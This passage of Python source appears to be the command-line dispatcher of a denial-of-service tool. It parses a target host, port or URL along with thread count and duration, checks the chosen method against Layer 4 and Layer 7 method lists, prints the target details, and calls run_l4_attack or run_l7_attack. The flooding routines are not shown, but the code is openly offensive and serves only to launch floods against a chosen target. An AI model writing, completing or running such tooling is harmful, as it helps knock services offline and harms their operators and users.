    threads = int(sys.argv[3])
    duration = int(sys.argv[4])

    if method not in ALL_METHODS:
        print(f"  {C.RED}✖ Unknown method: {method}{C.RESET}")
        print(f"  Available: {', '.join(sorted(ALL_METHODS))}")
        sys.exit(1)

    if method in LAYER4_METHODS:
        # Parse IP:PORT
        if not target_raw.startswith("http"):
            target_raw_clean = target_raw
        else:
            parsed = urllib.parse.urlparse(target_raw)
            target_raw_clean = f"{parsed.hostname}:{parsed.port or 80}"

        if ":" in target_raw_clean:
            host_part, port_part = target_raw_clean.rsplit(":", 1)
            port = int(port_part)
        else:
            host_part = target_raw_clean
            port = 80

        target_ip = resolve_host(host_part)

        if port > 65535 or port < 1:
            print(f"  {C.RED}✖ Invalid port (1-65535){C.RESET}")
            sys.exit(1)

        print(f"  {C.YELLOW}🎯 Target: {target_ip}:{port}")
        print(f"  🔥 Method: {method}")
        print(f"  🧵 Threads: {threads}")
        print(f"  ⏱  Duration: {duration}s")
        print(f"  💻 CPUs: {os.cpu_count()}{C.RESET}")
        print()

        run_l4_attack(target_ip, port, method, threads, duration)

    elif method in LAYER7_METHODS:
        if not target_raw.startswith("http"):
            target_raw = "http://" + target_raw
        url_obj = urllib.parse.urlparse(target_raw)

        print(f"  {C.YELLOW}🎯 Target: {url_obj.geturl()}")
        print(f"  🔥 Method: {method}")
        print(f"  🧵 Threads: {threads}")
        print(f"  ⏱  Duration: {duration}s{C.RESET}")
        print()

        run_l7_attack(target_raw, method, threads, duration)